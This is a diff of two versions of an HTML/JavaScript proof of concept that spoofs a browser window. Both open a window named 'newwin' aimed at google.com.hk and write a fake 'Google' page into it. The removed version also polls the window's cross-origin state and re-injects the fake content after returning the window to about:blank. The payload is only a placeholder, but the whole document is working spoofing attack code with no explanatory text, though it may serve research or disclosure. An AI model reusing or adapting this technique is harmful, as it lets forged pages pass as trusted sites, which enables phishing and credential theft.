@@ -1,38 +1,9 @@
-<script>
-var OW;
-var FAKE = "<title>Google</title><h1>The Phishing Page !!</h1>";
+<SCRIPT LANGUAGE="JavaScript">
+function winopen()
+{OW=window.open("", "newwin");
+OW.document.write("<TITLE>Google</TITLE>");
+OW.document.write("<h1>The Phishing Page !!</h1>");
+OW.document.close();}
 
-function inject() {
-  OW.document.write(FAKE);
-  OW.document.close();
-}
-
-function winopen() {
-  OW = window.open("", "newwin");
-  inject();
-  var poll = setInterval(function () {
-    if (OW.closed) { clearInterval(poll); return; }  // referensi putus
-    try {
-      OW.location.href;               // masih terbaca = masih about:blank
-    } catch (e) {                     // SecurityError = sudah di google.com.hk
-      clearInterval(poll);
-      setTimeout(goBack, 2000);       // jeda supaya Google sempat tampil
-    }
-  }, 50);
-}
-
-// Langkah 5: kembalikan window ke halaman sebelumnya
-function goBack() {
-  OW.location.replace("about:blank");
-  var wait = setInterval(function () {
-    try {
-      if (OW.location.href === "about:blank") {
-        clearInterval(wait);
-        inject();
-      }
-    } catch (e) { /* masih di Google, tunggu */ }
-  }, 50);
-}
-</script>
-<a href="https://www.google.com.hk/" target="newwin"
-   onclick="setTimeout(winopen, 1);">Google Home Page</a>
+</SCRIPT>
+<a href="javascript:window.open('https://www.google.com.hk/')" target="newwin" onclick="setTimeout('winopen()', 1);">Google Home Page</a>
